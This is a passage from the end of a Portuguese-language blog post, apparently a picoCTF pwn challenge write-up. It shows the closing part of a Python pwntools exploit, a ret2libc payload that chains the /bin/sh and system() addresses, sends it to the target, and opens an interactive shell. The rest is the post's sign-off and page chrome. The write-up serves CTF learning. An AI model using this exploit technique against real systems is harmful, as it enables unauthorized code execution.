</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_offset</span> <span class=o>+</span> <span class=n>libc_entrypoint</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_offset</span> <span class=o>+</span> <span class=n>libc_entrypoint</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2 or 3:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;wrong:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img alt=admin-panel10 loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel10.png></p><p>É isso. Espero que tenham gostado :)</p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/pwn/>Pwn</a></li><li><a href=http://localhost:1313/tags/ctf/>Ctf</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/blog/2024-08-09-aquisi%C3%A7%C3%A3o-de-imagens-forense/><span class=title>« Prev</span><br><span>Forense Digital: Aquisição de logs e memória volátil/não volátil</span>
</a><a class=next href=http://localhost:1313/blog/2024-07-15-intro-zero-knowledge/><span class=title>Next »</span><br><span>Introdução a provas de zero-knowledge - Parte 1</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Resolvendo os desafios iniciais de pwn do picoCTF on x" href="https://x.com/intent/tweet/?text=Resolvendo%20os%20desafios%20iniciais%20de%20pwn%20do%20picoCTF&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-02-picogym-pwn-easy%2f&amp;hashtags=pwn%2cctf"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Resolvendo os desafios iniciais de pwn do picoCTF on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-02-picogym-pwn-easy%2f&amp;title=Resolvendo%20os%20desafios%20iniciais%20de%20pwn%20do%20picoCTF&amp;summary=Resolvendo%20os%20desafios%20iniciais%20de%20pwn%20do%20picoCTF&amp;source=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-02-picogym-pwn-easy%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Resolvendo os desafios iniciais de pwn do picoCTF on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-02-picogym-pwn-easy%2f&title=Resolvendo%20os%20desafios%20iniciais%20de%20pwn%20do%20picoCTF"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Resolvendo os desafios iniciais de pwn do picoCTF on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-02-picogym-pwn-easy%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Resolvendo os desafios iniciais de pwn do picoCTF on whatsapp" href="https://api.whatsapp.com/send?text=Resolvendo%20os%20desafios%20iniciais%20de%20pwn%20do%20picoCTF%20-%20http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-02-picogym-pwn-easy%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Resolvendo os desafios iniciais de pwn do picoCTF on telegram" href="https://telegram.me/share/url?text=Resolvendo%20os%20desafios%20iniciais%20de%20pwn%20do%20picoCTF&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-02-picogym-pwn-easy%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Resolvendo os desafios iniciais de pwn do picoCTF on ycombinator" href="https://news.ycombinator.com/submitlink?t=Resolvendo%20os%20desafios%20iniciais%20de%20pwn%20do%20picoCTF&u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-02-picogym-pwn-easy%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Blog do GRIS</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>